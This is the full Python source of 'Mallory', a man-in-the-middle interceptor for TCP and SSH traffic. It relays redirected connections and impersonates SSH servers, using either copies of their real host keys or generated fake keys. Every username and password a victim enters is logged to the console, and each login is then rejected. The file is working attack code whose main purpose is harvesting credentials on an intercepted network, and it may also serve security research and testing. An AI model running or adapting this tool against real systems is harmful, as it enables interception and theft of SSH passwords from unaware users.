#!/usr/bin/env python
#
# Mallory - TCP and SSH interceptor
#
# By Stefan Tomanek <stefan.tomanek@wertarbyte.de>

import base64
from binascii import hexlify
import os
import socket
import sys
import traceback
import argparse
import struct
import select
import threading
import signal

import paramiko
from paramiko.py3compat import b, u, decodebytes

class MalloryServer:

	def __init__(self, port, localaddr='', use_socks=False, acl=None):
		self.port = port
		self.localaddr = localaddr
		self.use_socks = use_socks
		self.socket = None
		self.interceptors = []
		self.acl = acl

	def _get_dst(self, conn):
		if self.use_socks:
			return self._get_socks4_dst(conn)
		else:
			return self._get_ipt_orig_dst(conn)

	def _get_ipt_orig_dst(self, conn):
		SO_ORIGINAL_DST = 80
		sockaddr_in = conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
		(proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
		dst = "%d.%d.%d.%d" % (a, b, c, d)
		print('Original destination was: %s:%d' % (dst, port))
		return (dst, port)

	def _get_socks4_dst(self, conn):
		req = conn.recv(8)
		login = ""
		while True:
			d = conn.recv(1)
			if d == b"\x00":
				break
			login += d

		(ver, cmd, port, addr_a, addr_b, addr_c, addr_d) = struct.unpack("!2BH4B", req)
		if not (ver == 0x04 and cmd == 0x01):
			raise IOError("Invalid SOCKS4 request")
		dst = "%d.%d.%d.%d" % (addr_a, addr_b, addr_c, addr_d)
		print('Original destination was: %s:%d (login: %s)' % (dst, port, login))
		reply = struct.pack("!2BH4B", 0, 0x5A, 0, 0, 0, 0, 0)
		conn.send(reply)
		return (dst, port)

	def _bind_socket(self):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.bind((self.localaddr, self.port))

	def _loop(self):
		self.socket.listen(0)
		client, src = self.socket.accept()
		if self.acl and self.acl['src'] and \
		   (src[0] not in self.acl['src'] or not self.acl['src'][src[0]]):
			print("Rejecting connection from '%s:%d' due to client ACL" % src)
			return
		client_thread = threading.Thread(target=self._handle_client, args=(client, src))
		client_thread.setDaemon(True)
		client_thread.start()

	def _handle_client(self, client, src):
		try:
			dst = self._get_dst(client)
			if client.getsockname() == dst:
				print('Breaking connection loop back to us: %s:%d -> %s:%d' % (src, dst))
				return

			if self.acl and self.acl['dport'] and \
			   (dst[1] not in self.acl['dport'] or not self.acl['dport'][dst[1]]):
				print("Rejecting connection to '%s:%d' due to dport ACL" % dst)
				return

			for ior in self.interceptors:
				if ior.want(dst):
					print('[%s] Intercepting connection: %s:%d -> %s:%d' % (ior.__class__.__name__, src[0], src[1], dst[0], dst[1]))
					ior.intercept(client, dst)
					break
		finally:
			client.close()

	def add_interceptor(self, interceptor):
		self.interceptors.append(interceptor)

	def start(self):
		self._bind_socket()
		print('Listening for connections' + (' (SOCKS)' if self.use_socks else '') + '...')
		while True:
			self._loop()

class MalloryInterceptor:
	def __init__(self, localaddr=''):
		self.localaddr = localaddr

	def want(self, dst):
		pass
	def intercept(self, client, dst):
		pass

class TCPRelay(MalloryInterceptor):
	def want(self, dst):
		return True

	def intercept(self, client, dst):
		target = socket.create_connection(dst, source_address=(self.localaddr, 0))
		
		mapping = {}
		mapping[client] = target
		mapping[target] = client
		ss = select.select
		while True:
			input, output, xcept = ss(mapping.values(), [], [])
			for s in input:
				data = s.recv(1024)
				if len(data) == 0:
					target.close()
					client.close()
					return
				else:
					mapping[s].send(data)

class SSHRejectingServer(paramiko.ServerInterface):
	def __init__(self, identity=''):
		self.identity = identity
		self.event = threading.Event()

	def check_auth_password(self, username, password):
		print("""Auth attempt to '%s' with user '%s' and password '%s'""" % (self.identity, username, password))
		return paramiko.AUTH_FAILED

	def get_allowed_auths(self, username):
		return 'password'


class SSHHostKeyring:
	def __init__(self, fake_keys=False):
		self.keys = {}
		self.fake_keys = fake_keys

	def load_keyfile(self, filename):
		key = paramiko.RSAKey(filename=filename)
		fp = key.get_fingerprint()
		print('Read key ' + fmt_fp(fp) + ' from "' + filename +'"')
		self.keys[fp] = (key, True)

	def gen_key(self):
		key = paramiko.rsakey.RSAKey.generate(1024)
		fp = key.get_fingerprint()
		self.keys[fp] = (key, True)
		return key

	def get_key(self, fp):
		if fp in self.keys:
			return self.keys[fp]
		elif self.fake_keys:
			key = self.gen_key()
			self.keys[fp] = (key, False)
			real_fp = key.get_fingerprint()
			print('Generating new fake key for fingerprint ' +
			      fmt_fp(fp) + ' (actually ' + fmt_fp(real_fp) + ')')
			return self.keys[fp]
		else:
			return (None, True)

class SSHTargetDatabase:
	def __init__(self, localaddr=''):
		self.hosts = {}
		self.localaddr = localaddr

	def get_fp(self, dst):
		if (dst) not in self.hosts:
			fp = self.__get_server_fp(dst)
			self.hosts[dst] = fp

		return self.hosts[dst]

	def set_fp(self, dst, fp):
		self.hosts[dst] = fp

	def __get_server_fp(self, dst):
		client = paramiko.SSHClient()
		# now connect
		try:
			sock = socket.create_connection(dst,
			                                timeout = 5,
			                                source_address = (self.localaddr, 0))
		except Exception as e:
			print('*** Connect failed: ' + str(e))
			traceback.print_exc()
			return None
		t = paramiko.Transport(sock)
		try:
			t.start_client()
			key = t.get_remote_server_key()
			print('retrieved target fp: ' + fmt_fp(key.get_fingerprint()))
			return key.get_fingerprint()
		except paramiko.SSHException:
			print('*** SSH negotiation failed.')
			return None
		finally:
			t.close()
			sock.close()

class SSHInterceptor(MalloryInterceptor):
	def __init__(self, keyring, targets, localaddr='', fake_keys=False, blindcatch=False):
		MalloryInterceptor.__init__(self, localaddr)
		self.keyring = keyring
		self.targets = targets
		self.fake_keys = fake_keys
		self.blindcatch = blindcatch

	def want(self, dst):
		if (dst[1] != 22):
			return False
		fp = None
		if not self.blindcatch:
			# get host key of target
			fp = self.targets.get_fp(dst)
		if not fp:
			if self.fake_keys:
				key = self.keyring.gen_key()
				fp = key.get_fingerprint()
				print('Generated key for unknown host: ' + fmt_fp(fp))
				self.targets.set_fp(dst, fp)
			else:
				return False
		key, genuine = self.keyring.get_key(fp)
		if key:
			print('Got key: %s (%r)' % (fmt_fp(key.get_fingerprint()), genuine))
		else:
			print('No suitable keys found')

		if key and (genuine or self.fake_keys):
			return True
		return False

	def intercept(self, client, dst):
		fp = self.targets.get_fp(dst)
		key, genuine = self.keyring.get_key(fp)
		if key:
			t = paramiko.Transport(client)
			t.set_gss_host(socket.getfqdn(""))
			try:
				t.load_server_moduli()
			except:
				print('(Failed to load moduli -- gex will be unsupported.)')
				raise
			t.add_server_key(key)
			server = SSHRejectingServer("%s:%d" % (dst[0], dst[1]))
			try:
				t.start_server(server=server)
			except paramiko.SSHException:
				print('*** SSH negotiation failed.')
				return

			# wait for auth
			chan = t.accept(20)
			if chan is None:
				print('*** Timeout waiting for channel request.')

def fmt_fp(fp):
	fp = u(hexlify(fp))
	n = 2
	tokens = [ fp[i:i+n] for i in xrange(0, len(fp), n) ]
	return ':'.join(tokens)


def launch_server():
	parser = argparse.ArgumentParser()
	parser.add_argument("--port", type=int, dest="port", required=True, help="listening port")
	parser.add_argument("--socks", action="store_true", help="offer SOCKS4 (default: no)")
	parser.add_argument("--outaddr", type=str, dest='outaddr', default='',
	                    help="local ip address to use for outgoing connections")
	parser.add_argument("--bindaddr", type=str, dest='bindaddr', default='',
	                    help="local ip address to listen on")
	parser.add_argument("--autokeygen", action="store_true", help="generate random keys (default: no)")
	parser.add_argument("--blindcatch", action="store_true", help="catch all SSH connection (default: no)")
	parser.add_argument("--client", action="append", help="only accept connections from specified client address")
	parser.add_argument("--dport", action="append", help="only accept connections to specified ports")
	parser.add_argument('keys', metavar='KEYFILE', type=str, nargs='*',
                            help='SSH host key files')
	args = parser.parse_args()

	targetdb = SSHTargetDatabase(args.outaddr)
	keyring = SSHHostKeyring(args.autokeygen)
	failed_keys = []
	for farg in args.keys:
		if os.path.isdir(farg):
			for root, dirs, files in os.walk(farg):
				for file in sorted(files):
					fpath = os.path.join(root, file)
					try:
						keyring.load_keyfile(fpath)
					except:
						failed_keys.append(fpath)
						print("'%s' does not seem to be a valid keyfile, skipping..." % fpath)
		elif os.path.isfile(farg):
			try:
				keyring.load_keyfile(farg)
			except:
				failed_keys.append(farg)
				print("'%s' does not seem to be a valid keyfile, skipping..." % fpath)
		else:
			failed_keys.append(farg)
			print("Argument '%s' is neither directory nor file." % farg)

	print('%u distinct host keys have been loaded into the key ring' % len(keyring.keys))
	if failed_keys:
		print("The following files could not be loaded:")
		for file in failed_keys:
			print(file)

	acl = {'src': None, 'dport': None}
	if args.client:
		acl['src'] = {x:True for x in args.client}
	if args.dport:
		acl['dport'] = {int(x):True for x in args.dport}
	mallory = MalloryServer(args.port, args.bindaddr, args.socks, acl)
	mallory.add_interceptor(SSHInterceptor(keyring, targetdb,
	                                       args.outaddr,
	                                       args.autokeygen,
	                                       args.blindcatch))
	mallory.add_interceptor(TCPRelay(args.outaddr))
	mallory.start()

def quit(signal, frame):
	print('Terminating...')
	sys.exit(0)

if __name__ == "__main__":
	#paramiko.util.log_to_file('mallory_server.log')
	signal.signal(signal.SIGINT, quit)
	launch_server()
